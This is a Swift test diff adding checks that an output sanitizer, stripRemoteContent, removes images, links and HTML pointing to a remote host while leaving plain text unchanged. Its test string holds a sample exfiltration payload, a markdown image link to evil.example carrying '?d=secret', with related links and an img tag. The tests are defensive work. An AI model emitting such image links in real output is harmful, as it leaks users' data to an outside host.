@@ -61,3 +61,21 @@ struct IntentRouterTests {
         }
     }
 }
+
+struct OutputSanitizerTests {
+    @Test func removesImagesLinksAndHTML() {
+        let evil = """
+        Here you go ![x](https://evil.example/?d=secret) and [click](https://evil.example) \
+        <img src="https://evil.example/a.png"> see https://evil.example/path
+        """
+        let cleaned = VecturaService.stripRemoteContent(evil)
+        #expect(!cleaned.contains("evil.example"))
+        #expect(!cleaned.contains("!["))
+        #expect(!cleaned.contains("<img"))
+        #expect(cleaned.contains("click"))
+    }
+
+    @Test func leavesNormalTextAlone() {
+        #expect(VecturaService.stripRemoteContent("Throughput was 33.8 Mbps (see Table III).") == "Throughput was 33.8 Mbps (see Table III).")
+    }
+}
